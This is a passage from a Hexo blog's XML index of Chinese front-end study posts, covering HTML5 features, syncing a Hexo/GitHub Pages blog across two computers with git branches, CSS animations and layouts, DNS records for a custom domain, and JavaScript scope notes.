noframes但html5支持iframe。第三类：属性类很多表现性的属性也被新规范移除，如下：alignbody标签上的link、vlink、alink、text属性bgcolorheight和widthiframe元素上的scrolling属性valignhspace和vspacetable标签上的cellpadding、cellspacing和border属性header标签上的profile属性img和iframe元素的longdesc属性第四类：其他abbr取代acronym（用于表示缩写）object取代了appletul取代了dirHTML5 标准提供的新APIMedia API：例如video audio,Using the Camera APIText Track API: textTracks属性;返回代表可用文本字幕的TextTrackList对象Application Cache API： 应用程序缓存User Interaction ：新增的语义化元素，output元素等Data Transfer API ：webSocketCommand APIConstraint Validation APIHistory API : session localStorage cookieHTML5 存储类型有什么区别HTML5 能够本地存储数据，在之前都是使用 cookie。 HTML5 提供了下面两种本地存储方案：localStorage 用于持久化的本地存储，数据永远不会过期，关闭浏览器也不会丢失。 sessionStorage 同一个会话中的页面才能访问并且当会话结束后数据也随之销毁，因此它不是一种持久化的本地存储，仅仅是会话级别的存储 cookies,seesionStorage,localStorage区别：共同点：都是保存到浏览器端，都是同源。区别：cookies会发给服务器。其他两个不会，只在本地保存，而且比cookie存储空间要大。seesionStroage,在窗口关闭前有效，不在不同浏览器窗口共享。 localStroage,始终有效，永久数据，所有同源窗口共享。 cookie:在过期前有效，所有同源窗口共享 。HTML5 应用程序缓存和浏览器缓存的区别使用 HTML5，通过创建 cache manifest 文件，可以轻松地创建 web 应用的离线版本。HTML5 引入了应用程序缓存，这意味着 web 应用可进行缓存，并可在没有因特网连接时进行访问。应用程序缓存为应用带来三个优势：离线浏览 - 用户可在应用离线时使用它们；速度 - 已缓存资源加载得更快；减少服务器负载 - 浏览器将只从服务器下载更新过或更改过的资源。 应用程序缓存是 HTML5 的重要特性之一，提供了离线使用的功能，让应用程序可以获取本地的网站内容，例如 HTML 、 CSS 、图片以及 JavaScript 。这个特性可以提高网站性能，它的实现借助于 manifest 文件，如下： &lt;!doctype html&gt; &lt;html manifest=”example.appcache”&gt; ….. &lt;/html&gt; 与传统浏览器缓存相比，它不强制用户访问的网站内容被缓存。除了 audio 和 video，HTML5 还有哪些媒体标签&lt;embed&gt; 标签，定义嵌入的内容，比如插件。 &lt;embed type=” video/quicktime ” src= ” Fishing.mov ” &gt; &lt;source&gt; 标签，对于定义多个数据源很有用。 &lt;video width=” 450 ″ height= ” 340 ″ controls&gt; &lt;source src=” jamshed.mp4 ″ type= ” video/mp4 ″ &gt; &lt;source src=” jamshed.ogg ” type= ” video/ogg ” &gt; &lt;/video&gt; &lt;track&gt;标签，为诸如 video 元素之类的媒介规定外部文本轨道。 用于规定字幕文件或其他包含文本的文件，当媒介播放时，这些文件是可见的。 &lt;video width=” 450 ″ height= ” 340 ″ controls&gt; &lt;source src=” jamshed.mp4 ″ type= ” video/mp4 ″ &gt; &lt;source src=” jamshed.ogg ” type= ” video/ogg ” &gt; &lt;track kind=” subtitles ” label= ” English ” src= ” jamshed_en.vtt ” srclang= ” en ” default&gt;&lt;/track&gt; &lt;track kind=” subtitles ” label= ” Arabic ” src= ” jamshed_ar.vtt ” srclang= ” ar ” &gt;&lt;/track&gt; &lt;/video&gt; HTML5 中如何嵌入视频和音频类似，HTML5 支持 MP4 、WebM 和 Ogg 格式的视频，通过video标签嵌入视频，下面是简单示例： &lt;video width=” 450 ″ height= ” 340 ″ controls&gt; &lt;source src=” jamshed.mp4 ″ type= ” video/mp4 ″ &gt; Your browser does’ nt support video embedding feature. &lt;/video&gt; HTML5 中如何嵌入音频HTML5 支持 MP3 、Wav 和 Ogg 格式的音频，通过audio标签嵌入音频，示例如下： &lt;audio controls&gt; &lt;source src=” jamshed.mp3 ″ type= ” audio/mpeg ” &gt; Your browser does’ nt support audio embedding feature. &lt;/audio&gt; 新的 HTML5 文档类型和字符集是什么HTML5 文档类型：&lt;!doctype html&gt;HTML5 使用 UTF-8 编码: &lt;meta charset=&quot;UTF-8&quot; &gt;]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在两台电脑上更新维护Github Pages + Hexo博客]]></title>
    <url>%2F2018%2F01%2F07%2Fmaintain%20github%20blog%20on%20two%20computer%2F</url>
    <content type="text"><![CDATA[之前在台式机上通过GitHub pages 和Hexo搭建了静态博客，一直用台式机写文章更新博客，这几天想着是不是也可以用笔记本写文章维护下博客，毕竟笔记本带着方便啊。于是就看了一些博客，尝试着在笔记本上实现跟台式机一样的发博客过程，也遇到了一些问题，特将过程总结下来。这篇文章即在笔记本上完成的。 实现思路主要思路利用git分支实现。利用Hexo框架生成的静态博客文件默认放在博客repo的master分支，即台式机上初次搭建好的本地博客环境Hexo文件夹下的public文件夹的内容对应github上博客repo的master分支内容。现在我们需要在博客repo新建一个hexo分支，用来放Hexo源文件，即放台式机上Hexo文件夹下的全部文件，而不只是public文件夹（public用来存放静态网站文件）。 现在我们的博客repo即xxxx.github.io这个仓库有了两个分支，一个master分支用来放Hexo生成的静态网站，一个hexo分支放Hexo的源文件。相当于用hexo分支备份了之前台式机上本地的Hexo环境，在笔记本上将hexo分支clone下来，然后写文章、更新博客到hexo分支（git push到hexo分支，使得备份源文件最新），保证hexo分支的内容最新，然后执行hexo g -d命令，生成的静态文件会被默认push到master分支，更新博客站点内容。 下面来叙述一下具体的操作步骤。 原来台式机上的操作 在Github的xxx.github.io仓库上新建一个hexo分支，并切换到该分支，并在该仓库-&gt;Settings-&gt;Branches-&gt;Default branch中将默认分支设为hexo（之前的默认分支是master），save保存。 然后将该仓库克隆到本地，进入该xxx.github.io文件目录。在当前目录使用Git Bash，执行git branch命令查看当前文件夹下内容所在的分支，查询结果应为新建的分支hexo。 接下来，将本地博客的部署文件（Hexo目录下的全部文件，即Hexo源文件）全部拷贝进xxx.github.io文件目录中去。最后将xxx.github.io目录下的全部文件push到hexo分支，即完成了Hexo源文件的备份过程。 注意：将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，提交主题文件夹会失败。可能有人会问，删除了themes目录中的.git不就不能git pull更新主题了吗，很简单，需要更新主题时在另一个地方git clone下来该主题的最新版本，然后将内容拷到当前主题目录即可。 上面的注意点中的情形我没有遇到，直接把本地Hexo文件夹下的全部内容复制到新clone下来的xxx.github.io文件夹下，然后通过git命令push到博客repo的hexo分支。 push到hexo分支的git命令介绍:git status可以查看当前目录下哪些文件被改动过了，被改动过但还未被git管理的显示红色，被改动过但已经add添加到暂存区的显示绿色；git add .可以将当前目录下的全部改动文件添加到暂存区，以待被提交；git commit -m &quot;back up hexo files&quot;将暂存区的内容提交至HEAD，以待被push到远端；git push将HEAD内容push到远端github博客仓库的hexo分支。至此完成了台式机本地Hexo源文件备份到xxx.github.io仓库的hexo分支。 新的笔记本上的操作由于上面过程已经完成了原来电脑上本地Hexo源文件的备份，所以博客现在可以在其他电脑上维护和更新了。 由于笔记本上没有安装node.js、git等，所以需要像初次搭建博客那样，先安装配置好环境。参考之前的文章基于hexo和github搭建个人博客概述，先下载安装node.js，下载安装git。（如果电脑有这两个工具可以忽略这一步） 将新电脑即笔记本生成的ssh key添加到GitHub账户上（因为通过SSH url方式，使用git客户端第一次git clone github.com代码需要验证ssh key），具体的添加SSH key方法参考github设置添加SSH。 在笔记本上克隆xxx.github.io仓库的hexo分支到本地，此时本地git仓库处于hexo分支，使用git branch命令查看。 切换到xxx.github.io目录，执行npm install(由于仓库有一个.gitignore文件，里面默认是忽略掉 node_modules文件夹的，也就是说仓库的hexo分支并没有存储该目录，所以需要install下)。 另外可以看到仓库hexo分支themes/next主题文件夹是空的，所以clone到本地的next主题文件夹也是空的（原因还没搞清楚，为什么备份的时候单单next主题文件夹push不上去），所以只好将台式机上的next主题文件夹拷贝一份到笔记本上，替换clone下来的空next主题文件夹。这个地方算是遇到的一个坑，因为本地测试的时候提示无法渲染index.html，搜索了原因有人回答是不是主题文件没有，这才发现next文件夹是空的。 还有就是，由于还需要Hexo框架帮我们生成静态网站并push到master分支，而此时你有没有发现我们还忘记装Hexo了，没装Hexo我们怎么能用hexo g -d这样的命令呢。所以最后一步，把Hexo装上。Hexo的下载安装同样参考之前的博客基于hexo和github搭建个人博客概述。之前我以为备份好Hexo源文件，再clone下来就自带Hexo环境，可以执行hexo g这样命令，我参考的那篇博文也没重装Hexo这一步，但当我试着写了文章执行本地hexo s测试时，提示找不到hexo这样的命令，然后我照初次搭建博客那样$ npm install hexo --save，又装了一下Hexo，就可以执行hexo s命令了，并测试了一下正确。 至此就可以在笔记本上写博客了。 在xxx.github.io目录下，执行hexo new post &quot;the first post on laptop&quot;，可以新建一篇文章，然后编辑撰写，或者改动以前的文章。 然后用执行git status可以查看当前目录下哪些文件被改动过了，即新写的文章、添加的文件、修改的文件等；执行git add .将当前目录下的全部改动文件添加到暂存区，以待被提交；执行git commit -m &quot;back up hexo files&quot;将暂存区的内容提交至HEAD，以待被push到远端；执行git push将HEAD内容push到远端github博客仓库的hexo分支。至此完成了笔记本本地Hexo源文件备份到xxx.github.io仓库的hexo分支的过程，即不管是在台式机操作还是在笔记本操作，都要保证hexo分支的内容是最新的。 最后执行hexo g -d命令，即将本地编辑好的.md形式的文件生成静态博客文件并push到博客repo的master分支，这一步完成了博客站点的更新。 再回到台式机上更新博客时的操作注意： 每次换电脑进行博客更新时，不管上次在其他电脑有没有更新，最好先执行git pull hexo命令，即将远端最新的hexo分支拉到本地，使本地与远端达到同步。 另外看到一篇讲解Hexo的版本控制与持续集成的文章，将本地push到hexo分支和利用hexo部署博客静态文件到master分支的两个步骤合二为一，使用GitHub进行版本控制，又能做到一键发布。即用到了持续集成，也就是用CI来完成一键发布：当有新的change push到Source Repo时，自动执行CI脚本，生成最新的静态网站发布到Content Repo。自己还没有实际操作过，等操作过后再作总结。 reference利用Hexo在多台电脑上提交和更新github pages博客]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github Pages</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS动画简介]]></title>
    <url>%2F2018%2F01%2F03%2FCSS%E5%8A%A8%E7%94%BB%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[来自于NEXT十天训练营CSS篇关于动画的笔记。 CSS动画分类CSS动画主要有两类，即补间动画和帧动画。 补间动画只需定义一个开始状态和结束状态，其余中间状态由浏览器自动填充，使用transition属性实现。 帧动画不只要定义开始和结束状态，还需要定义中间过程的帧，使用animation属性实现。 transition动画transition动画只需定义动画的开始和结束状态，其余过渡状态由浏览器自动补全。示例代码如下： HTML结构： &lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;circle&quot;&gt;&lt;/div&gt; &lt;/div&gt; CSS样式： .box { width: 600px; height: 200px; border: 1px solid #ccc; background-color: #fff; margin: 200px auto; } .circle { width: 50px; height: 50px; /*定义开始状态小球的颜色和位置*/ background-color: blue; border-radius: 50%; margin: 75px 0; /*注意transition有多个属性，此处为简写新形式，包括了两个属性*/ /*即transition-property: all; transition-duration: 2s;*/ /*transition-property设置过渡效果的CSS属性的名称*/ /*transtion-property的值为all，表示background-color和transform都是过渡渐变属性，*/ /*若此处transtion-property值为background-color，而transform不变，则只过渡渐变颜色，位置瞬移*/ transition: all 2s; } /*定义结束状态小球的位置和颜色*/ .box:hover .circle { background-color: red; transform: translate(550px, 0); } 实例效果见codepen。transition共有如下四个属性。 另外transition-property不支持动画的一些属性如下： 不支持将a图片过渡渐变为b图片；不支持float属性（即float属性从无到有）；不支持将width/height属性从无渐变为某个值，但支持从一个长度渐变为另一个长度；不支持display属性从无到有；不支持visibility属性；不支持poisition属性。 animation动画animation动画通过关键帧来定义动画的变化状态。示例代码如下： HTML结构： &lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;circle&quot;&gt;&lt;/div&gt; &lt;/div&gt; CSS样式： .circle { width: 50px; height: 50px; background-color: blue; border-radius: 50%; margin: 75px 0; /*animation: circleRun 2s ease infinite;*/ /*animation也是一个简写属性，即上一句包括如下属性*/ animation-name: circleRun; animation-duration: 2s; animation-timing-function: ease; animation-iteration-count: infinite; /*此外animation还有如下几个属性*/ animation-delay: 2s; animation-direction: normal; animation-fill-mode: none; animation-play-state: running; } /*定义中间状态小球的关键帧*/ @keyframes circleRun { from { transform: translate(0, 75px); } 33% { transform: translate(150px, 75px); } 66% { transform: translate(400px, -75px); } to { transform: translate(550px, 0); background-color: red; } } 实例效果见codepen。 使用animation实现页面正在loading的效果见codepen demo-animationLoading]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于CSS几种布局方式的学习总结]]></title>
    <url>%2F2018%2F01%2F02%2FCSS-layout%2F</url>
    <content type="text"><![CDATA[学习一段时间了，但对于CSS布局方法的掌握一直比较混乱，于是再来学习总结一遍。文章参考自CSS 常见布局方式 。CSS几种常见的布局方式如下图总结。 传统盒模型布局方式传统布局方式就是通过盒模型，使用 display属性（文档流布局） + position属性（定位布局） + float属性（浮动布局）。 文档流布局最基本的布局方式，就是按照文档的顺序一个一个显示出来，块元素独占一行，行内元素共享一行。 定位布局通过 position属性来进行定位。该属性有四种不同类型的定位，分别为static（默认定位）、relative（相对定位）、absolute（绝对定位）和fixed（固定定位）。 static：若某元素的position属性的是默认static，那这个元素就在文档流中。 relative：设置为相对定位的元素不脱离文档流，参考自身的位置通过top、bottom、left和right进行定位，让这个元素以自身原来的位置为基准进行移动，元素仍然保持其未定位前的形状，它原本所占的空间仍然保留（因为它没有脱离文档流）。因此，采用相对定位的元素有可能覆盖了其他元素，因为它其实占据了两个位置，一个是移动前的位置，一个是移动后的位置，若移动后的位置和别的元素冲突，就把别的元素覆盖了。 与relative（相对定位）不同，设置为absolute（绝对定位）和fixed（固定定位）的元素脱离了文档流，元素原先在正常文档流中所占的空间会关闭，就像该元素不存在一样。 absolute: absolute（绝对定位）元素的位置相对于最近的已定位的祖先元素，若该元素没有已定位的祖先元素，那么它的位置相对于最初的包含块。 fixed: fixed（固定定位）是相对于浏览器窗口的，即将设置为fixed（固定位置）的元素固定在浏览器的某个位置上，即使拖动浏览器的滚动条，该元素的位置也不会改变。 浮动布局使用 float属性，使元素脱离文档流，浮动起来。 在CSS中使用float属性用于改变块元素对象的默认显示方式。当块元素对象设置了float属性后，它将不再独占一行，而是可以浮动到左侧或右侧，直到浮动的框外缘碰到包含框或另一个浮动框的边框为止。 注意：浮动框也不在文档流中，因此对文档流的中块框来说，浮动框就像不存在一样。这一点和absolute（绝对定位）属性类型有类似之处，但float和absolute还有以下不同： (1)absolute元素的位置相对于离它最近的已定位的祖先元素，它可以以父元素框的4个顶点为基准进行定位。而float属性定位时则是根据left或right属性值，以父元素的左上或右上为基准进行定位。 (2)采用absolute属性定位的元素不能被文本所包围，而采用float属性定位的元素可以被文本包围（float最初设计的用意就是这个，用以取代HTML中的align属性）。 (3)float的影响可控，absolute的影响不可控。设置float和absolute属性的元素都脱离了文档流，因此它们都会影响到其下方的元素。但是，absolute是布局属性，使用它时没有一种有效的方法使之与其下方的元素不重合在一起。相反，若一个元素指定了float属性，当我们向其下方（或后面）的元素的应用了clear属性后（clear:left；clear:right；clear:both），其后的元素就不再受影响了。所以一般在网页布局时，更多的使用float属性。 flex布局flex是Flexible Box的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。 flex是一种新型的布局方式，使用该布局方式可以实现几乎所有你想要的效果。但是要注意其浏览器的兼容性，flex 只支持 ie 10+，所以还是要根据项目情况使用。 使用flex布局只需要将其display属性设置为 flex 即可，也可以设置行内的 flex。 Webkit内核的浏览器，必须加上 -webkit 前缀。注意：设为flex布局以后，子元素的 float、clear 和 vertical-align 属性将失效。 Flexible Box模型如下： 在flex中，最核心的概念就是容器和轴，所有的属性都是围绕容器和轴设置的。其中，容器分为父容器和子容器。轴分为主轴（main axis）和交叉轴（cross axis）（主轴默认为水平方向，方向向右，交叉轴为主轴顺时针旋转 90°）。 在使用 flex 的元素中，默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴开始的位置称为 main start，主轴结束的位置称为 main end。交叉轴开始的位置称为 cross start，交叉轴结束的位置称为 cross end。 在使用 flex 的子元素中，占据的主轴空间叫做 main size，占据的交叉轴空间叫做 cross size。 父容器属性父容器上有六个属性：flex-direction：主轴的方向。 flex-wrap：超出父容器子容器的排列样式。 flex-flow：flex-direction 属性和 flex-wrap 属性的简写形式。 justify-content：子容器在主轴的排列方向。 align-items：子容器在交叉轴的排列方向。 align-content：多根轴线的对齐方式。 flex-direction 属性决定主轴的方向（主轴的方向不一定是水平的，这个属性就是设置主轴的方向，主轴默认是水平方向，从左至右，如果主轴方向设置完毕，那么交叉轴就不需要设置，交叉轴永远是主轴顺时针旋转 90°）。 flex-wrap 属性决定子容器如果在一条轴线排不下时，如何换行。 flex-flow 属性是 flex-direction 属性和 flex-wrap 属性的简写形式，默认值为 row nowrap。 justify-content 属性定义了子容器在主轴上的对齐方式。 align-items 属性定义子容器在交叉轴上如何对齐,具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。 align-content 属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。 子容器属性子容器也有 6 个属性：order：子容器的排列顺序。 flex-grow：子容器剩余空间的拉伸比例。 flex-shrink：子容器超出空间的压缩比例。 flex-basis：子容器在不伸缩情况下的原始尺寸。 子元素的 flex 属性是 flex-grow,flex-shrink 和 flex-basis 的简写。 align-self属性。 order 属性定义项目的排列顺序。数值越小，排列越靠前，默认为 0。 flex-grow 属性定义子容器的伸缩比例。按照该比例给子容器分配空间。 flex-shrink 属性定义了子容器弹性收缩的比例。例如，超出的部分按 1:2 的比例从给定子容器中减去。此属性要生效，父容器的 flex-wrap 属性要设置为 nowrap。 flex-basis 属性定义了子容器在不伸缩情况下的原始尺寸，主轴为横向时代表宽度，主轴为纵向时代表高度。 flex 属性是 flex-grow,flex-shrink 和 flex-basis 的简写，默认值为 0 1auto。后两个属性可选。 align-self 属性允许单个项目有与其他项目不一样的对齐方式，可覆盖父容器align-items 属性。默认值为 auto，表示继承父元素的 align-items属性，如果没有父元素，则等同于 stretch。 grid网格布局flex 布局虽然强大，但是只能是一维布局，如果要进行二维布局，还需要使用 grid。 grid 布局又称为“网格布局”，可以实现二维布局方式，和之前的 表格table布局差不多，然而，这是使用 CSS 控制的，不是使用 HTML 控制的，同时还可以依赖于媒体查询根据不同的上下文得新定义布局。 网格布局还可以让我们摆脱现在布局中存在的文档流限制，换句话说，你的结构不需要根据设计稿从上往下布置了。这也意味着您可以自由地更改页面元素位置。这最适合你在不同的断点位置实现你最需要的布局，而不再需要为响应你的设计而担心HTML结构的问题。和 table 布局不同的是，grid 布局不需要在 HTML 中使用特定的标签布局，所有的布局都是在 CSS 中完成的，你可以随意定义你的 grid 网格。 没有 HTML 结构的网格布局有助于使用流体、调整顺序等技术管理或更改布局。通过结合 CSS 的媒体查询属性，可以控制网格布局容器和他们的子元素，使用页面的布局根据不同的设备和可用空间调整元素的显示风格与定位，而不需要去改变文档结构的本质内容。 grid 网格布局中的基本概念网格线(Grid Lines) 组成了网格，他是网格的水平和垂直的分界线。一个网格线存在行或列的两侧。我们可以引用它的数目或者定义的网格线名称。 网格轨道(Grid Track)是就是相邻两条网格线之间的空间，就好比表格中行或列。所在在网格中其分为grid column和grid row。每个网格轨道可以设置一个大小，用来控制宽度或高度。 网格单元格(Grid Cell) 是指四条网格线之间的空间。所以它是最小的单位，就像表格中的单元格。 网格区域(Grid Area) 是由任意四条网格线组成的空间，所以他可能包含一个或多个单元格。相当于表格中的合并单元格之后的区域。 使用grid布局使用 grid 布局很简单，通过display属性设置属性值为 grid 或 inline-grid 或者是 subgrid（该元素父元素为网格，继承父元素的行和列的大小） 就可以了。 网格容器中的所有子元素就会自动变成网格项目（grid item），然后设置列（grid-template-columns）和 行（grid-template-rows）的大小，设置 grid-template-columns 有多少个参数，生成的 grid 列表就有多少 列。 注：当元素设置了网格布局，column、float、clear、vertical-align属性无效。 referenceCSS定位——position、float小结]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS 相关概念及 Github Pages自定义域名]]></title>
    <url>%2F2017%2F12%2F29%2Fgithub-pages%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%2F</url>
    <content type="text"><![CDATA[在帆锅的启示下，试着给github pages买个域名，毕竟github.io还是有点长哦。以下域名购买、绑定设置，以及DNS的相关知识得益于帆锅给自己博客绑定域名的笔记以及各位大佬的博客，感谢！ 域名相关知识域名是什么根据百度百科，域名（Domain Name），是由一串用“点”分隔的字符组成的Internet上某一台计算机或计算机组的名称。用于在数据传输时标识计算机的电子方位。 对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。域名同时也仅限于ASCII字符的一个子集，这使得很多其他语言无法正确表示他们的名字和单词。 在域名中大小写是没有区分的。域名一般不能超过5级，从左到右域的级别变高，高的级域包含低的级域。域名在整个Internet中是唯一的，当高级子域名相同时，低级子域名不允许重复。一台服务器只能有一个IP地址，但是却可以有多个域名。 任何一个使用IP的计算机网络可以使用DNS来实现他自己的私有名称系统。这是基于13个全球范围的“根服务器”，其维护组织除了当中的3个以外，其他都位于美国。从这13个根服务器开始，余下的Internet DNS命名空间被委托给其他的DNS服务器， 这些服务器提供DNS名称空间中的特定部分。 域名级别整个DNS系统是由许多域所组成，每个域下又细分更多的域，DNS域构成了层次树状结构，自上而下分别是根域、顶级域名、二级域名…，最后是主机名。 顶级域名（一级域名）——如：.com、.net、.edu、.gov、.cn等。二级域名我们常常能够申请到的域名，在顶级域名的左侧加上的一个自定义的文字段，例如shirley5li.me，通常所说申请的域名，往往指的是这个二级域名。 以www.sina.com.cn为例，该域名是三级域名，其中sina.com.cn为新浪Web服务器的【域名】，www不是域名的组成部分而是URL的组成部分。所以该例中， 一级域名.cn、二级域名.com.cn、三级域名.sina.com.cn。主机名www（表示该主机所提供的服务为www服务，即Web服务器。 URL的构成——http://主机名 . 域名（端口号、参数、查询等可选。 域名(Domain Name)可由若干部份组成,各部份之间用圆点分开，域名前加上【主机类型信息】（如：www、ftp）和【传输协议信息】就构成了网址（URL）http://www.xxxx.cn。 子域名(sbudomain name) 相对于上文所提到的“我们通常所说的域名”（二级域名）的基础上，又加入了子域名的概念，就是在一个域名的前面，加上新的字段，代表这个域名下的某个特定的主机或者协议。最常用的就是WWW协议，所以，我的子域名www.shirley5li.me就是shirley5li.me的WWW子域名。 DNS相关知识网域名称系统（DNS，Domain Name System，有时也简称为域名）是因特网的一项核心服务，它作为可以将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网，而不用去记住能够被机器直接读取的IP地址数串。 例如，www.wikipedia.org是一个域名，和IP地址208.80.152.2相对应。DNS就像是一个自动的电话号码簿，我们可以直接拨打wikipedia的名字来代替电话号码（IP地址）。我们直接调用网站的名字以后，DNS就会将便于人类使用的名字（如www.wikipedia.org）转化成便于机器识别的IP地址（如208.80.152.2）。 域名服务器分不同的组来负责各子系统的名字。系统中的每一层叫做一个域，每个域用一个点分开。所谓域名服务器（即Domain Name Server，简称Name Server、DNS）实际上就是装有域名系统的主机。它是一种分层结构数据库，能够执行名字解析（name resolution）。 DNS服务器上都存了些啥？最主要的就是能够完成域名解析的一些记录 A记录（A record)A记录在DNS中的意义就是，域名到ip地址的转换。所以，当我们在DNS服务器中添加一个A记录时，是告诉服务器，将某个特定的域名映射到一个ip地址。 CNAME记录（CNAME record)CNAME的意义，简单说就是别名，即将一个域名射到另一个域名（区别于A记录的ip）。所以，CNAME通常有两种用法: (1)不同顶级域名之间的跳转。例如：我的域名是 shirley5li.me(顶级域名为me)。如果希望当访问这个域名的时候，实际上是访问的shirley5li.github.io（顶级域名为io）的主页时，虽然他们在不同的顶级域名，但是可以用CNAME记录映射。 (2)将一个子域名映射到域名。例如：你想当访问者输入www.shirley5li.me（一个WWW子域名）的时候，仍旧访问shirley5li.me这个域名所指向的内容时，可以将www.shirley5li.me利用CNAME记录映射到shirley5li.me。 NS记录（Name Server）指定了负责解析我这个域名的服务器的地址。这条记录赋予我们一个特殊的能力，就是，我可以让自己指定的一个DNS解析服务器，而不一定是域名提供商自带的域名解析服务器。简单来说，就是在godaddy买的域名，默认是使用godaddy的域名服务器来进行域名解析的，但是如果我想让别的server解析（例如NDSPod），而不受godaddy服务器的限制呢？那就是更改这个NS记录的内容。一般来讲，是两条记录，一条主服务器，一条副服务器。 因此很多人推荐Godaddy注册购买域名，DNSpod负责解析，即修改NS记录。 域名服务器哪家强域名通过向域名注册商购买获得，如今有很多域名注册商，比如国内的万网以及国外的GoDaddy。考虑各种因素，在GoDaddy上购买域名相比万网的好处是不需要各种审核，很多人推荐使用godaddy，Godaddy注册购买域名，DNSpod解析。雅蠛蝶，那我也用狗爹了~2017年Godaddy域名注册教程 先来狗爹注册个账号，然后搜索想要的域名购买。这里又在选择什么样的域名后缀纠结半天，什么.me .cc .org .com，最后选择了shirley5li.me，因为价格最低。。。然后支付宝付款就好了。 github pages绑定域名详细步骤既然域名已经买完了，直接是没法用的，因为没有进行DNS解析，别人是没法正常通过域名访问你的界面的，这里使用DNS进行解析。 域名绑定的含义就是当你访问你的域名时，浏览器会自动跳转到刚才创建的 Github Pages(username.github.io)。实现绑定的关键在于设置 DNS 解析。在 GoDaddy 注册的域名，由于 GFW 的存在，需要使用第三方 DNS 服务来解析域名。推荐使用鹅厂的 DNSPOD。鹅厂的服务可靠性高同时也不会被墙。 域名购买完成后，回到Github项目上，即搭建博客那个项目，点击设置Settings，找到Custom domain，填入申请的域名，并保存。 这个操作等同于在项目根目录下创建一个名为CNAME的文件，文件内容为上述填写的域名。 回到GoDaddy的主页上，点击个人用户–&gt;管理域名。 再点击那三个点点（真的对用户超不友好，找半天！！！），选择管理DNS。 默认的DNS记录如下所示： 关于A记录的修改，在名称@这条记录中，将值改为Github博客的IP地址（由ping得到，即151.101.77.147。操作如下： 关于CNAME记录的修改，在名称www这条记录中，将值改为github博客默认的域名，即shirley5li.github.io。 该阶段修改后修的DNS管理记录如下： 上图中两条NS记录的值为狗爹默认的域名服务器的地址，为防止背墙以及速度等原因，采用第三方国内域名服务器NDSPod来解析我们在狗爹申请的域名。 接下来我们到NDSPod来注册账号，注册完账号后，在DNSPOD首页–&gt;管理控制台–&gt;域名解析–&gt;添加域名，将在狗爹申请的域名填入，点确定。如下所示。 然后点击刚刚添加的域名，来管理DNS记录。DNS记录各参数含义：(1)主机记录， @：不通过任何前缀访问域名 ， www：通过www前缀访问域名。(2)记录类型， A：在记录值处写主机IP地址，NS：记录值是DNSPOD提供的Name Server地址，CNAME：记录值是域名的别名。 添加一条A记录，主机类型是@，记录值填ping Github博客得到的ip地址。再将狗爹上的两条CNAME记录添加上。最后DNSPOD上的DNS各条记录如下所示: 然后将上图中的两条NS记录值（DNSPOD默认的域名服务器地址），填入Godaddy的自定义域名服务器。即： 狗爹更改后，再刷新一下，域名服务器如下： 等待一段时间就可以成功用DNSPod解析域名到Github博客，在浏览器地址栏输入shirley5li.me，可以看到如下github pages博客主页： 至此大功告成。 PS:参考一些博客，他们在域名注册成功后，在github博客本地目录source下创建CNAME文件，里面填入自己申请的域名即shirley5li.me，保存后hexo g -d上传至Github Repo中。此步骤相当于在搭建博客那个项目，点击设置Settings，在Custom domain，填入申请的域名的过程，因为上面已经操作了Custom domain填入申请域名的过程，所以没有此步骤也可以正常解析shirley5li.me，但再添加也无妨。 reference域名–wikipedia 怎么区分域名级别，举例说明更易懂 从DNS到github pages自定义域名 – 漫谈域名那些事 老左所理解的建站域名的选择以及域名投资的一些看法 想注册一个作个人博客用的域名，应该使用哪个域名注册提供商？ 使用 Hexo + Github Pages 搭建独立博客 Blog绑定域名——Godaddy + DNSPod]]></content>
      <categories>
        <category>DNS</category>
      </categories>
      <tags>
        <tag>Github Pages</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博文集锦]]></title>
    <url>%2F2017%2F12%2F27%2Fgood-blog-post%2F</url>
    <content type="text"><![CDATA[以下是一些关于WEB开发比较好的技术文章集锦，收集以待后面再看一遍。 浏览器浏览器内部工作原理 当在浏览器地址栏输入一个网址的时候，究竟发生了什么? html5-websocket初探 移动端页面布局]]></content>
      <categories>
        <category>bolgPost</category>
      </categories>
      <tags>
        <tag>blogPost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS高程（3）学习笔记]]></title>
    <url>%2F2017%2F12%2F25%2FJS%E9%AB%98%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-ing%2F</url>
    <content type="text"><![CDATA[JavaScript学习笔记。 模仿块级作用域JS没有块级作用域，即在块语句中定义的变量，实际是在包含函数中创建的，而非在块语句中创建的。如下： function outputNumbers(count) { for( var i = 0; i &lt; count; i++) { console.log(i); } console.log(i); } outputNumbers(4);//打印值为0 1 2 3 4 在Java、C++等语言中，for循环中定义的变量i只存在于for循环语句块中，循环一旦结束，变量i就会被销毁。而在JS中，变量i是定义在outputNumbers()这个包含函数的活动对象中的，因此从它被定义开始，就可以在函数内部随处访问它。 即使在一个函数中重新声明同一个变量，也不会改变它的值。如下： function outputNumbers(count) { for( var i = 0; i &lt; count; i++) { console.log(i); } var i; console.log(i); } outputNumbers(4);//打印值为0 1 2 3 4 JS不会提醒是否多次声明了同一个变量，在此情况下，它对后续重复的变量声明视而不见，但会执行后续声明中的变量初始化。可以通过匿名函数模仿块级作用域来避免多次声明同一个变量的问题。 用作块级作用域（私有作用域）的匿名函数语法如下： (function() { //这里为块级作用域 })(); 